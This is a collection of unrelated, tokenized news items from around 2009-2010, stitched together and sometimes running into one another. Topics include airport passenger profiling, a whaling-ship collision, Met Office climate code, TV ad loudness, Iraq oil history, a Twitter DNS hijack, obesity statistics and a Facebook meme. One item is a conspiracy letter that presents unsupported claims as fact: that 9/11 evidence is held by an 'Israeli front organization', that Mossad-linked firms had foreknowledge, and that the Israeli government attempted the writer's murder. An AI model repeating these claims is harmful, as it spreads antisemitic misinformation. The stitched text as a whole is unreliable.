In the wake of the alleged attempt to bomb a Detroit - bound plane , Britain could step up airport security with targeted passenger profiling .
But how effective is it ?
The issue of passenger profiling can be controversial Standing in a long queue at airport security with your fractious family , you might think it is pretty obvious you do not look like a terrorist .
But is your journey through security about to get easier - and your flight safer ?
The government says it is considering screening passengers to decide which should undergo more rigorous security checks .
But the practice , known as passenger profiling , is controversial .
People behaving suspiciously or with an unusual travel pattern might find themselves under additional scrutiny but racial or religious factors could also soon form part of the criteria .
But , in weighing up the merits of targeted versus random checks , the government will have to do its maths , because this seemingly straightforward idea is anything but in reality - not just because of fears that passengers will be unfairly discriminated against on grounds of ethnicity or religion , but because it involves some counter - intuitive number work .
For a start , in relying on who your statistics tell you is potentially high risk , your statistics could become unreliable , according to David Spiegelhalter , professor of the public understanding of risk at Cambridge University .
FIND OUT MORE More or Less is on BBC Radio 4 on Fridays at 1330 GMT , and repeated Sunday 2000 GMT
Or catch up on the iPlayer " You 're combating an intelligent adversary who could change their strategy in response to what you do , " he says .
To make sure your system is not predictable , any profiling strategy would have to be complemented by additional random checks across the whole passenger population .
" Game theory [ an area of maths used , among other things , to predict and understand behaviour ] shows that in response to an intelligent adversary , it often can be optimal to adopt a level of randomisation .
" There must be an element where your computer says this individual must be examined carefully , whether it's a five - year - old child or a 90 - year - old , so any opponent knows they might be examined no matter how little they seem to fit the risk profile . "
Unlikely bomber
Hard to imagine a five - year - old or a 90 - year - old becoming radicalised .
But if people like that were never checked , a terrorist could see an opportunity .
Umar Farouk Abdulmutallab is accused of trying to bomb an airliner
There is a famous example of an apparently unlikely bomber - a young pregnant Irish woman called Anne- Marie Murphy , who was planning to fly from London to Israel in 1986 , recounts Philip Baum , editor of Aviation Security International .
Ms Murphy 's boyfriend - who , unknown to her , was a Jordanian militant - had planted explosives on her , hoping she would get on to the flight without arousing suspicion , Baum says .
But in this instance , Baum notes , the plot was stopped because of the intense passenger profiling carried out by Israeli flight security .
Ms Murphy did not seem like a typical traveller for that flight .
To make sure innocent people are not used in this way , passengers should be selected for extra checks using a graded scale of risk , according to Prof Spieglhalter .
A computer scientist from the University of Texas , William Press , believes he has done the maths to come up with a good way of doing exactly that .
Additional checks
Suppose you have two people - passenger X and passenger Y - and your brilliant profiling suggests
Mr X is 100 times more likely than Mr Y to be a terrorist .
Your stats tell you to pick out Mr X for additional security checks 100 times more often than Mr Y.
But William
Press says that would be a mistake .
Security resources are finite , and the threat is varied
He says if you take the square root of their risk it narrows the gap between them - so you check Mr X only 10 times more often than Mr Y .
That means you do not expend all your resources checking only one tiny group of people every time they turn up at an airport - and hardly ever checking people who pose a lower risk , but still a risk .
Basically , you widen your net .
In reality , of course , your intelligence is unlikely to be as brilliant as that example suggests .
Getting good and useful data for profiling is difficult .
But , even if you supposed you had an almost perfectly accurate profiling system , there is another problem - terrorists are very rare and that leads to some counter - intuitive statistics .
If someone is stopped by security for extra checks because they seem to pose a potential risk , they are almost certainly innocent , Prof Spiegelhalter suggests .
" There are more than a 100 million people flying out of UK airports every year and you might be trying to foil one or two terrorist plots , " he says .
" Even if you had a profiling system that was 99.99 % accurate , there would be 1 in 10,000 errors .
" If you consider that around 100 million people go through UK airports each year , that would mean 10,000 innocent people would trigger the system . "
" I would hope that in any training of staff , this is really rammed home .
" If you 're not going to cause enormous resentment about this , it 's got to be very delicately handled - maths tells you that . "
So although statistics could help catch terrorists , to some degree , they do not make it easy , and they probably will not get you through airport security any quicker .

A hi-tech anti-whaling speedboat resembling a stealth bomber had its bow sheared off and was taking on water today after it collided with a Japanese whaling ship in Antarctica .
The six crew members of the Sea Shepherd Conservation Society speedboat were safely rescued .
The clash was apparently the most serious in the past several years , during which the marine conservation group has sent vessels into far southern waters to try to harass the Japanese fleet into ceasing its annual whale cull .
The society said its boat the Ady Gil was hit by the Japanese ship the Shonan Maru near Commonwealth Bay and had its bow sheared off .
" The condition of the Ady Gil now is that it is inoperable and the crew of the Ady Gil has been transferred to our other vessel , the Bob Barker , " Locky Maclean , the first mate of the society 's lead ship told Australian Broadcasting Corpation radio .
The Ady Gil 's captain had stayed on board to try to save equipment " before it floods too severely , " he said .
Clashes using hand - thrown stink bombs , ropes meant to tangle propellers and high - tech sound equipment have been common in recent years , as have collisions between ships .
Japan 's fisheries agency , which has no direct involvement in whaling but oversees Japanese fishing operations , said it was still checking details about the clash .
" We have confirmed that there was a collision , but we have no other details .
We have not heard that any boats have sunk .
We are now trying to confirm details of why the collision occurred , " said a fisheries agency spokesman , Toshinori Uoya .
He said there were no injuries on the Japanese vessel , but said he was not sure about the Ady Gil crew members .
Sea Shepherd sends boats to Antarctic waters each southern summer to try to stop the Japanese fleet killing whales under what the fleet calls a scientific whaling programme .
Conservationists and many countries say the programme is a front for commercial whaling .
Earlier today , the Institute of Cetacean Research ( ICR ) , the non-profit organisation that conducts the hunt , said that one of the ships in the whaling fleet was attacked by the Ady Gil , but it did not mention a collision .
It said the Ady Gil arrived on the scene at about 6 pm GMT yesterday and that its crew threw ropes at the whaling lead ship , the Nisshin Maru .
It said another Sea Shepherd vessel , the Bob Barker , had already arrived in nearby waters .
The Ady Gil came " within collision distance " of the Nisshin Maru 's bow and repeatedly dangled a rope in the water in an attempt to entangle the ship 's rudder and propeller , and lobbed small projectiles designed to release a foul smell , said the ICR .
The whalers responded by firing high - powered hoses to keep the Sea Shepherd vessels away .
" The obstructionist activities of the Sea Shepherd threaten the lives and property of those involved in our research , are very dangerous and cannot be forgiven , " the ICR statement said .
Each side routinely alleges the other engages in dangerous activity .
Australia and New Zealand – which have Antarctica territories – have urged both sides to show restraint , warning that they are far from rescue if anything goes wrong .
Japan 's whaling fleet left in November for its annual hunt in the Antarctic waters .
Uoya said that for security reasons , details of the fleet 's composition , the number of whales it hoped to take and the number of crew members was not being released .

In response to the Climategate goings on the UK Meteorological Office has released a subset of its land surface climate station records and some code to process it .
The code consists of 397 lines of Perl ( station_gridder.perl and make_global_average_ts_ascii.perl ) .
At various times I have been asked to suggest which part of an application ’s or product ’s source code should be made available to a third party .
The third party may have been interested in evaluating the quality , getting a feel for the complexity or felt that they ought at least be able to say they had seen some code .
In these situations there is always a trade - off between impressing the customer ( e.g. , well structured code containing lots of comments ) and not revealing too much ( e.g. , impenetrable code with no comments ) .
Have the Met Office released the code they have used over a period of time or have they release newly written code ?
The source does not have the characteristics often seen in well worn , ‘ old ’ , code .
There is no revision history ( that may be due to poor programming practices or may have been stripped off prior to release ; I discuss pretty printing below ) , the visual layout is generally consistent ( this may be because the same small group of people have worked on it over time ) , there are no obvious hacks used to get around previous design decisions that have changed and unscientifically it just feels to me like newly written code .
Was the original code written in another language ( e.g. , Fortran ) , perhaps as part of a larger program and been rewritten in Perl ?
The code does not have a Fortran ‘ accent ’ to it .
The code was written by people who are fluent in Perl ; perhaps they do not know Fortran very well and were given time to craft something presentable , hence no Fortran accent .
Why have I been referring to the code authors , plural , when writing 397 lines is well within the capabilities of a competent developer working for a day ( I bet the authors spent longer in meetings about this code than actually writing it ) ?
Developers tend to have very fixed habits when it comes to bracketing statements with curly braces , there are those who always put the open brace at the end of the line and those who always put it on a newline .
The Met Office code contains both usages , sometimes within the same subroutine .
Also the use of whitespace around punctuators and operators does not follow a consistent pattern , which for me rules out the use of an automated pretty printer and kind of implies more than one person doing the editing .
And why are some variables names capitalized and other not ( the names in subroutine read_station are all lower case while the names in the surrounding subroutines are mostly upper case ) ?
More than one author is the simplest answer .

Representatives said noisy adverts were ' frustrating ' for viewers
The US House of Representatives has approved a bill which aims to limit the volume of television advertisements .
The Commercial Advertisement Loudness Mitigation Act ( CALM ) was approved by a voice vote in the house .
Democrat Anna Eshoo , who filed the motion , said most Americans were willing to tolerate adverts but were annoyed by sudden volume increases .
She said broadcasting industry 's current voluntary system had failed to deal with the issue .
The CALM bill means that within a year , the Federal Communications Commission ( FCC ) must introduce guidelines proposed by the Advanced Television Systems Committee ( ATSC ) in November .
Under the rules , " excessively noisy or strident " advertisements would be banned , as would adverts which are noticeably louder - or have a " maximum loudness substantially higher " - than the programme they accompany .
The FCC would have another year before it had to start enforcing the standards .
Democrat representative Rick Boucher said loud advertising was " very frustrating " for viewers .
" It 's an annoying experience , and something really should be done about it , " the AFP news agency quoted him as saying .
Ms Eshoo said the legislation would force the industry to adhere to its own standards .
" Volunteerism has n't worked for 50 years , " the Associated Press news agency quoted her as saying .
The legislation needs to be approved by the Senate , which is considering an identical bill .
At least 40 people in El Salvador have died after three days of rain , officials said Sunday .
Salvadoran Interior Minister Humberto Centeno said deaths were reported in at least five of the 14 provinces of the tiny , mountainous Central American country .
Reuters news agency put the death toll as high as 54 .
The rains were caused by a low pressure system off the country 's Pacific coast , meteorologists said .
Dave Roberts of the U.S. National Hurricane Center in Miami said while the presence of Hurricane Ida in the Caribbean may have played some indirect role in helping steer the system , the deaths are not directly linked to the hurricane .
Ida made landfall Thursday over east - central Nicaragua , destroying hundreds of homes and power lines , before weakening to a tropical storm .
Ida then regained strength to become a Category 2 hurricane Sunday afternoon , with winds sustained winds of 160 km / and stronger gusts as it passed near the tip of Mexico 's Yucatan Peninsula .
French artist Anastassia Elias takes discarded toilet paper rolls and carefully and patiently creates tiny domestic scenes inside the brown paper roll .
It 's amazing how art has evolved from off the sides of mugs into quaint mixed media .
Each scene is cut out from the inside so as not to disturb the integrity of the paper roll - an almost absurdly gentle approach to one of the most commonplace waste materials on the planet … yet somehow reminiscent of the ancient art of painting inside of blown - glass balls , which had only the smallest of openings on one side .
The tiny toilet paper scenes depict domestic bliss – people are sitting calmly in rocking chairs , shopping or looking out the window .
The calm domesticity is a subtle reference to the humble origins of the toilet paper roll .

In 1914 British and German companies negotiated joint participation in the newly - founded Turkish Petroleum Company that held prospecting rights in Mesopotamia .
-- The San Remo Agreement of 1920 gave Britain political control over all Mesopotamia , in return for France taking over the German share in the Turkish Petroleum Company .
-- France was not satisfied with its secondary role in world oil , and it set up the Compagnie Francaise des Petroles in 1924 to take up the French stake in Mesopotamia , now a British colony renamed Iraq .
-- In Oct. 1927 , an exploration team of the Turkish Petroleum Company hit a gusher , proving oil reserves in large quantities near Kirkuk in northern Iraq .
The Turkish Petroleum Company was renamed the Iraq Petroleum Company ( IPC ) in 1929 .
Finds at Mosul and Basra followed , and several new fields were discovered and put into production in the 1940s and 1950s .
-- In July 1928 , Britain , the United States , France and the Netherlands effectively agreed to share out Iraq ’s oil with the so - called “ Red Lines Agreement ” .
Royal Dutch / Shell , Anglo - Persian , CFP , Exxon , Mobil , Atlantic Richfield , Gulf Oil Corporation , Standard Oil of Indiana ( Amoco ) , and Participations and Explorations Corp. , established a joint venture -- the Near East Development Company -- to jointly develop fields in many other Middle East countries falling within the red line marked on the map by the negotiators .
-- The Red Line Agreement was scrapped in the grand Hotel Aviz in Lisbon , Portugal , in Nov. 1948 .
-- In April 1932 , a British - dominated international consortium , British Oil Development Company ( BODC ) , obtained a 75 - year oil concession for territory lying west of the Tigris and north of the 33rd parallel .
The consortium was intended to be a competitor to IPC in Iraq .
Ten years later , before it would start production , BODC was bought out by Mosul Petroleum Company ( MPC ) , a fully owned subsidiary of IPC .
-- In Dec. 1938 , Basra Petroleum Company ( BPC ) , another subsidiary of IPC , obtained a 75 - year concession for the rest of Iraq .
Thus all of Iraq , with the exception of the “ transferred territory , ” came under IPC ’s control .
Competition was eliminated .
--
The IPC was nationalized in 1972 , as were all foreign - owned oil companies by 1975 , and all facets of Iraq ’s oil industry were thereafter controlled by the government through the Iraq National Oil Company and its subsidiaries .
-- Desperate to boost revenues and oil sales after years of war , Saddam Hussein tried in the 1990s to strike deals with oil companies from China , Russia and elsewhere to develop some of Iraq ’s fields .
The deals were not finalised , partly due to international sanctions .

NEW DELHI ( Reuters ) -
The heavy punishment of illegal file sharers on the web will be counter - productive in the global fight against Internet piracy and copyright infringement , the director - general of a United Nations agency said on Thursday .
Francis Gurry of the World Intellectual Property Organisation ( WIPO ) said music copyright protection was “ under the most severe stress ” and the problem will likely spread to films as web connections speed up .
The music industry has been hit by rampant Internet piracy and has so far struggled to persuade consumers to pay for downloaded music .
Some 40 billion music files were illegally shared on the web in 2008 , a piracy rate of 95 percent , WIPO cites industry estimates as showing .
“ I do n’t believe we are going to win this , ( to ) find the solution by putting teenagers in jail , ” Gurry said in an interview on a visit to India .
“ I think that is not going to win public sympathy . ”
“ Part of the battle here is to sensitise the public to the fact that there is a real issue involved .
It is not simply a victimless crime , ” he added .
The rise in prosecutions of file sharers has seen some high profile cases carrying hefty fines .
Gurry cited the case of a student in the United States ordered to pay $ 675,000 for sharing 30 songs this year .
In another suit in April , four men behind The Pirate Bay , one of the world ’s biggest free file - sharing websites , were sentenced to a year in jail and ordered to pay $ 3.6 million in compensation .
Gurry said there has been no clear answer to copyright protection though several schemes , such as a flat rate access charge to a large music database , have been put forward .
Governments such as Britain and France are pushing measures to clamp down on illegal file sharing to help the European recorded - music market , now worth about 7 billion euros ( $ 10 billion ) a year , compared with almost 12 billion euros in 2001 .
On the heels of a French move , Britain will push ahead with punishments that could result in repeat offenders losing their net connection .
“ There are a lot of signs that the copyright system is under the most severe stress in making the transition from the physical world to the digital world , ” Gurry said .
“ Now that the capacity , the bandwidth is improving , of course there ’s going to be a similar issue for films , ” he added .

A Spider - Man impersonator was arrested on outstanding criminal warrants Wednesday after an incident in which he allegedly slugged a man near the Hollywood & Highland complex , police said .
It was not immediately clear what led to the altercation , which was reported about 12:30 p.m. in the 6800 block of Hollywood Boulevard .
But it ’s the latest in a string of incidents involving movie characters and celebrity look - alikes who vie for space -- and attention -- along the tourist - filled corridor that includes Grauman ’s Chinese Theatre .
Christopher Loomis , 39 , was being held on outstanding misdemeanor warrants in lieu of $ 5,500 bail , police said .
The incident began when Los Angeles Police Department patrol officers received a radio call reporting battery by a man in a Spider - Man costume .
When they arrived , they encountered four people dressed as the web - slinging crusader .
“ They stopped one , it was n’t him , ” said LAPD Lt. Beverly Lewis .
“ They stopped the second , and it was the suspect . ”
The victim , who said he had been hit on the face and arms , refused to press charges against the costumed impersonator .
But Lewis said that when they discovered the warrants , Loomis was booked .
She said it appeared that the suspect and victim knew each other .
Costumed impersonators portraying the likes of Elvis , Superman , SpongeBob SquarePants and others have worked on Hollywood Boulevard for years .
They collect tips from tourists by posing for pictures or performing in front of the theater .
But sometimes the fun has turned violent .
Tourists have complained that some costumed characters become abusive when the tourists refuse to pay them to pose for pictures .
There have also been brawls .
Two years ago , authorities convened a “ superhero summit ” designed to reduce tensions among the performers .
The meeting was prompted in part by an incident in which LAPD officers arrested a “ Star Wars ” street performer in his furry brown Chewbacca costume for allegedly head - butting a tour guide who complained about the impersonator ’s treatment of Japanese tourists .
In other incidents , actors dressed as the superhero Mr. Incredible , Elmo the Muppet and the dark - hooded character from the movie “ Scream ” were arrested for aggressive begging .
A man dressed as the horror film character Freddy Krueger was also taken into custody for allegedly stabbing someone , although no charges were filed .
“ Typical Hollywood ; it ’s always something different , ” said Lewis , an officer at the LAPD ’s Hollywood station .
As she spoke , Loomis , still wearing his Spider - Man outfit , sat nearby , handcuffed to a bench .

An online attack Friday morning on Twitter was the result of the simplest of security breaches : someone got the password to enter the master directory of Twitter ’s Internet addresses and then redirected users to an alternate site instead .
No user information appears to have been stolen in the attack .
But the security breach  the third major one at Twitter this year  underscores the continuing weakness of the company ’s systems as its micro-blogging service is becoming more important to business and even global politics .
The incident also highlights a basic vulnerability in the way life is lived as it becomes increasingly digital :
With so much vital information stored on the Web , people are only as safe as their passwords .
During the assault , which security analysts said began about 1 a.m. and lasted roughly an hour , hackers tinkered with Twitter ’s domain name servers , which are hosted by a Manchester , N.H. , company called Dyn .
When Web surfers tried to reach Twitter ’s pages , they were sent instead to a site for the “ Iranian Cyber Army , ” which claimed responsibility for the attack .
JERUSALEM  Israel ’s Supreme Court ruled on Tuesday that a major access highway to Jerusalem running through the occupied West Bank could no longer be closed to most Palestinian traffic .
In a 2 - to - 1 decision , the court said the military overstepped its authority when it closed the road to non-Israeli cars in 2002 , at the height of the second Palestinian uprising .
The justices gave the military five months to come up with another means of ensuring the security of Israelis that permitted broad Palestinian use of the road .
“ The court was saying that you ca n’t reasonably find every Palestinian inhabitant to be a security risk , ” said Moshe Negbi , a legal commentator for Israel Radio , in a telephone interview .
“ The security considerations are legitimate , but they have to find other solutions . ”
The closely watched case , argued by the Association for Civil Rights in Israel , was brought by a half - dozen Palestinian villages where land was expropriated for the road and inhabitants were barred from using it .

Having viewed Jesse Ventura ’s Conspiracy
Theory documentary episode dealing with the Sept. 11 attacks , I would like to call your attention to a detail that the research team may have overlooked , namely the proprietorship of Hangar 17 , where the only known 9/11 evidence still in existence is locked away from public scrutiny .
When viewed from a certain angle , Hangar 17 in JFK airport has a prominent , unfaded billboard that says ” Tower Air “ .
Tower Airlines was an * Israeli * airline that went bankrupt in 2000 .
None other than Hangar 17 housed Tower Air ’s then brand - new corporate headquarters .
Why does 9/11 evidentiary material that would provide clues such as the absence or presence of Super Thermite or other explosive material in the dust from the blasts sit for “ safekeeping ” in the former Executive Headquarters of a ten - year - defunct Israeli front organization that contracted heavily for the U.S. Defense Department and still has an unfaded sign hanging on the building ?
Mike Ruppert reported that the Israeli container and freight - shipping corporation Zim , who occupied several floors in the Twin Towers and is widely known to do extensive operational support work for the Mossad , vacated all their offices days before the attacks – and they vacated in violation of their lease .
As excellent as Jesse Ventura ’s expose is , Wikipedia openly identifies Tower as an American airline , controlled , however , by Israelis – http://en.wikipedia.org/wiki/Tower_Air . ) : “ Major artifacts from the World Trade Center are housed for safekeeping in the former Tower Air Hangar 17 at John F. Kennedy International Airport . ”
[ efoods ]
As a matter of fact , while posing as a dinky , small - time Israeli airline that played second - fiddle to El - Al by catering mainly to Israel - New York Orthodox Jewish air traffic ( dubbed affectionately by their clientele ” ChassidicAir ” – Tower even printed and distributed booklets on the arcane Halachic aspects of how to face Jerusalem during the uninterruptible Standing Prayer on New York - bound flights should the “ Fasten Seat Belts ” sign start flashing during turbulence ) , Tower Air won several exclusive major contracts from the United States Department of Defense to transport U.S. armed forces personnel to overseas locations .
Tower was the second largest troop carrier during the first Persian Gulf War , flying U.S. troops and cargo in 300 sorties .
In 1993 , Tower kept busy flying U.S. military personnel and cargo to support operations in Somalia .
It was the first airline to fly troops into Mogadishu and also transported refugees for the United Nations during the conflict .
The pattern in my mind that caused the Tower Air sign in Conspiracy Theory to jump out at me like a red flag upon seeing it was established in the late ’ 80 ’s and early ’ 90 ’s , when , in my capacity as the Diplomatic Project Director for the Federation for American Afghan Action , I identified one of the many facets of Israeli involvement in the Iran - Contra Affair , and exposed a U.S. / Israeli front organization that was operationally similar to Tower Air in many respects .
It was ( and is , as far as I ’m aware ) called the Intergraph Corporation , which served as the diversion pipeline mechanism to Iran for SuperHawk spare parts from allied military installations in Western Europe through Israel to Iran , rendering entire U.S. and NATO ground - to - air missile defense umbrellas inoperative and vulnerable .
I personally saw Intergraph shipments in Ben Gurion Airport ’s Mamman Hangar building while investigating the matter in collaboration with a former Westinghouse employee who was fired and subsequently victimized in a campaign to destroy his livelihood and several murder attempts , similar to the campaigns that have been and are currently being waged against me .
Eleven years ago , during Netanyahu ’s first tenure as Israel ’s Prime Minister , my Report on the Acquiescence of the Israeli Government in Palestinian Authority First Strike in Judea and Samaria ( published as Policy Paper # 107 by the Ariel Center for Policy Research ) made it to the desk of the Israeli Minister of Defense ( one may Google the report ) , whose office contacted me for an “ interview ” , and since then I have learned a double lesson : how brittle are the evil policies of betrayal and abandonment when smashed by the light of public exposure and indignation , and how no brutality will be considered too low to commit for a government functionary who has been faced with a choice between loyalty to a principle of human values , ethics , or morals on the one hand , and loyalty to a source of power on the other – and has chosen the latter .
Every action he will subsequently make will be dedicated to suppression and cover-up of his convoluted covert agendas , even if it means condemning inconvenient innocents to suffering or death .
I was targeted in a murder attempt by the Israeli government ( a police car rammed me as I was waiting at a red light ; no less than six ambulances were pre-positioned at the scene and evacuated bystanders who suffered minor injuries while leaving me in my totaled car at the scene ) ; while thank God the attempt at my life was unsuccessful , I did sustain among other things spinal damage and a fractured pelvis that has rendered me crippled until this day , and for the past six years witnessed a craftily orchestrated campaign to destroy my twenty - year - marriage and once beautiful family with six children whom I am currently in the midst of battling for with Israel ’s own version of Child Protective Services .
And woe to the man who does not have the money to either heal or defend himself against the vengeance of the wicked ones of this world .
There are several more parallels and similarities to Hangar 17 that demonstrate just how far , and with what determined desperation the power - hungry Hollow People
In Power are willing to go to topple the walls of civilization .
In a global society that has become careless of justice , a materialist civilization that daily grows more and more insecure and panicky as awareness begins to seep through that they are standing over an abyss , the bourgeois barbarians and morally castrated scumbags will never acknowledge defeat or concede the only imperative that holds for them any relevance : their appetite to concentrate and maintain power .
Our obligation – those of us who have fought to retain enough of our souls to sense the impending tragedy – is to continue our struggle against the extinction of the idea of mission .
Our mission – recalling that simplest of truths for which the Founding Fathers battled tyranny to establish our nation , that there are things more precious than life , and more horrible than death – is to establish a formal political mechanism to achieve and express a consensus based upon that “ simple truth ” of life and death so that those who seek to trample that line may no longer be remotely comfortable in the ease with which they swindle us into accepting their tyrannical objectives .

Americans may not be collectively doomed to die in their recliners after all , one hand in the chips bag , the other stretching for the remote .
Obesity levels seem to be leveling off or slowing across most of the population , according to two new comprehensive studies of the nation ’s heft .
The assessments , from the Centers for Disease Control and Prevention , are a welcome respite from the seemingly endless reports of Americans getting fatter and fatter .
The latest of several to find an obesity plateau , they suggest that those earlier findings were not aberrations but that Americans may truly have turned a corner .
But it ’s not time to reach for the cookie jar yet .
Though abundant messages about eating smaller portions and getting regular exercise may finally be registering , health experts say there ’s more to be done before the fattening trend is not merely halted but reversed -- more policy changes , community programs and support groups .
Americans are still among the chunkiest folks on the planet , with 68 % of adults overweight or obese .
Advertisement
“ This is not a cause for complacency or celebration , ” says Dr. William H. Dietz , director of the Division of Nutrition , Physical Activity and Obesity at the CDC , “ but it is cause for modest optimism . ”
One of the new studies , both released online Wednesday in the Journal of the American Medical Assn. , examined height and weight data in a nationally representative sample of 5,555 adult Americans collected in 2007 and 2008 .
In the sample , 33.8 % of the subjects was obese .
Those numbers were compared to ones collected from 1999 to 2006 in a similar sample .
Among women , obesity statistics remained fairly flat throughout the period encompassed by the two studies .
Obesity rates among men rose slightly during the decade , but leveled off in the later years .
The second study examined nationally representative data on 3,281 children and teens ages 2 to 19 , as well as 719 infants and toddlers .
It found that obesity rates -- about 10 % for infants and toddlers and 18 % for adolescents and teens -- have also been fairly consistent over the last 10 years .
Advertisement
The one exception was the heaviest weight class for boys ages 6 to 19 , whose numbers have risen .
Cynthia Ogden , an epidemiologist for the CDC ’s National Center for Health Statistics and lead author of the children ’s report , said the findings track with other reports , such as the Youth Risk Behavior Surveillance System , which saw a plateau among students in grades nine through 12 from 2005 to 2007 .
“ We ’re continuing to see slowing , ” Ogden said , “ although the prevalence of obesity remains very high . ”
Obesity experts said they ’re not sure what ’s causing the slowdown .

Just as many factors contribute to making people fatter -- sedentary lifestyles ; availability of inexpensive , fattening foods ; and fewer walkable communities -- a comparable number could explain why our weight is now holding steady .
Dietz believes that an increasing consciousness of the crisis , coupled with copious public health messages and policies , may have contributed .
It ’s hard to have missed the admonitions in the last several years about choosing lower - fat foods , eating smaller portions and getting regular , moderate exercise .
At the same time , more states and counties are providing healthier school lunches , banishing sugary sodas from campuses and passing laws to put nutritional information on restaurant menus .
However , Dietz said , “ we do n’t know what people are doing differently ” yet because it has n’t been measured .
Advertisement
Another theory about the plateau is that the population has gotten as fat as it ’s going to get -- that it has reached a kind of “ fat set point . ”
“ It ’s an interesting idea , ” albeit one that needs more research , Ogden said .
She noted that similar plateaus have been observed in other countries but at different national rates of obesity .
Dr. Howard Eisenson , program director of the Duke Diet & Fitness Center in Durham , N.C. , sees glimmers of hope in the studies but says the real challenge is to get people to exercise .
“ The survey only looks at BMI ; it does n’t look at physical fitness , which does n’t get enough attention , ” he said .
“ Poor physical fitness is a matter of big concern . ”
The key to reversing the obesity trend may lie in preventing children from becoming overweight in the first place , said Dr. Thomas Robinson , professor of pediatrics at Stanford University and director of the Center for Healthy Weight at Stanford ’s Lucile Packard Children ’s Hospital .
Advertisement
“ We have had more success in preventing obesity in children than we have in trying to treat obesity in adults , ” Robinson said .
“ Most [ adults ] regain the weight they lose . ”
Grass - roots movements in communities to get children active and teach them better nutrition have been effective , he added , but much more needs to be done .
“ We ’ve seen nothing with obesity that compares to how we ’ve addressed the H1N1 flu in terms of the amount of resources and . . . effort , ” he said .
“ What the results call for is an even greater priority placed on the problem -- so that hopefully things will start to turn back . ”

LANGENHAIN , Germany —
Youth from a drama troupe joined with local dignitaries this week to address themes of exclusion and prejudice as they commemorated Human Rights Day with the Baha 'i community of Germany .
The program took place at the Baha'i National Center , on the grounds of the European Baha'i House of Worship , with more than 200 people in attendance .
The performance by the People 's Theater , a youth project in the city of Offenbach , took a look at relationships between native Germans and immigrants , while other parts of the program focused on the situation of the Baha 'is in Iran , especially a group of some 50 young people in Shiraz who are being punished for organizing activities for underprivileged children .
Three of the Shiraz group are serving four - year prison sentences .
" I find it deeply shocking that the Baha 'i youth in Shiraz engage in social activities in the same way as we do in Offenbach , but with one difference – whereas here in Germany our efforts are rewarded with prizes , the Baha 'i youth in Shiraz must pay for their services to Iranian society with prison sentences and other coercive measures , " said Peggy Habermann , coordinator of the People 's Theater .
Kamal Sido , head of the Near East division of the Society for Threatened Peoples , attended the gathering and offered words of support for those persecuted in Iran .
The chairwoman of the Green Party in the German federal state of Hesse , Kordula Schulze - Asche , expressed indignation over the human rights violations perpetrated in Iran , as did Gisela Stang , mayor of Hofheim , which encompasses Langenhain .
Messages were read from two members of the German Federal Parliament , Erika Steinbach of the Christian Democratic Union and Omid Nouripour of the Green Party .
Ingo Hofmann , representing the Baha'i community of Germany , presented an overview of the current situation of the Baha 'is in Iran .
In Shiraz , he said , Haleh Rouhi , Raha Sabet , and Sasan Taqva , had organized , with permission from authorities , an educational program for underprivileged children .
They were later accused of having propagated the Baha'i Faith , even though a report commissioned by the government concluded that their activities were strictly humanitarian .
The three were sentenced to prison terms .
Before performing " Souls of Shiraz , " a piece composed for the occasion , musician Anke Keitel spoke of the invisible ties she feels with those imprisoned in Iran .
" Haleh , Raha , and Sasan believe just like me in the universality of human rights .
They strive to foster the well - being of humanity , just as I do .
And they are just as young as I am , " she said .
Human Rights
Day is celebrated annually around the world and marks the anniversary of the adoption – on 10 December 1948 – by the United Nations General Assembly of the Universal Declaration on Human Rights .

In an interview with IndustryGamers.com , the CEO of Electronic Arts , John Riccitiello , has stated that the company initially ‘ bet on the wrong horse ’ at the beginning of this console - generation .
Expecting that Sony ’s Playstation 3 would have a larger userbase than Nintedo ’s Wii , EA was left in a relatively weakened state when the Wii became a hit and the Playstation failed to reach a wide audience directly after it was launched .
This also led to underinvestment in new IP , though Riccitiello stated that the company has entered a new direction by focussing on less products , but supporting these with more resources and also expanding towards the digital distribution of products .
Though investors have not yet bought in to this new vision of the company , Riccitiello is confident this will happen in time .
This new vision has resulted in Electronic Arts closing several studios over the past year , including Pandemic Studios , and laying off approximately 1500 jobs .
Riccitiello justified this decision by stating that “ it ’s possible to create better revenue and greater profitability on the packaged goods side with fewer titles and more investment in those titles , hence the reduction of resources and personnel in that arena .
It ’s a painful call , but the right one . ”
Bra Color Status on Facebook Goes Viral Breast cancer advocates like bra color status updates , but will it help them ?
Jan. 8 , 2010  -- " Black My Regular , " was Anna Davison Smith 's post yesterday on Facebook .
" Handbags , no ? " commented her brother - in - law Ian Davison .
" Put me out of my misery . "
Olive
White was at first baffled by all the colors being cited on Facebook by her women friends .
" But I 've got it now , good job . "
A lot of Facebook users did n't get it .
In the last 24 hours , women have randomly been posting the color of their bras on their status updates , bewildering their friends and titillating the men in their lives -- all to raise awareness for breast cancer research .
At noon today , " color status on Facebook " was number 11 on Google Trends and was making fast gains on Twitter .
Click here to visit the Susan G. Komen for the Cure Web site .
No one seems to know its origin .
Detroit Free Press is taking credit for its city in starting the phenomenon .
BellyBeyond blog also suggests the Motor City .
White , a 43 - year - old nanny who lives in New York City , is convinced the Facebook phenomenon started in Britain then quickly went viral in the United States .
" I saw my Irish and English friends post colors in the past few days and now the Yanks are at it , " said White , who was born in Ireland .
" It 's pretty funny that mostly black is coming up .
Because of all the ice going on over in Ireland , I was thinking about the roads , " she told ABCNews.com referring to dangers of black ice .
" Then when someone from Scotland wrote , ' pink , ' I thought it was pink eye .
Finally I asked what was with all the colors . "
" I hope some sizes come up next , " commented one of her male friends .
Another realist quipped , " I am still waiting for someone to be honest and say grey . "
" Some of my posts are pretty embarrassing , " said White .
" It 's madness .
Some people are writing ' nude ' and the guys are saying , ' Great , I 'll come over . '
Nude is a color of brown . "
October is breast cancer awareness month , but organizations that support the cause say they are thrilled with the free publicity .
" We think it 's terrific , " said Andrea Rader , a spokesman for Susan G. Komen For the Cure , an organization that raises funds for breast cancer research .
" It 's a terrific example of how little things get started on the Internet and go a long way to raise cancer awareness . "
Fun Way to Raise Awareness of Breast Cancer
" We hope that the impact of this kind of thing online is representative of how you can use grassroots efforts to educate and lead people to go to places like Komen and get educated .
If we can raise funds along the way , even if we did n't start it , that 's great . "
The trend seemed to have started with a chain e-mail that asked women to forward it to all the female friends in their address book .
" Some fun is going on .... just write the colour of your bra in your status .. just the colour , nothing else , and send this on to ONLY girls no men ... it will be neat to see if this will spread the wings of cancer awareness .
It will be fun to see how long it takes before the men will wonder why all the girls have a color in their status ... thanks ladies ! "
Note that the word " colour " uses the British spelling .
Davison Smith , a 32 - year - old police detective from Buckinghamshire , England , received her e-mail from a friend in Costa Rica .
" It came from my half brother 's on - off partner in Costa Rica yesterday afternoon , " she told ABCNews.com .
" I do n't know where she got it from .
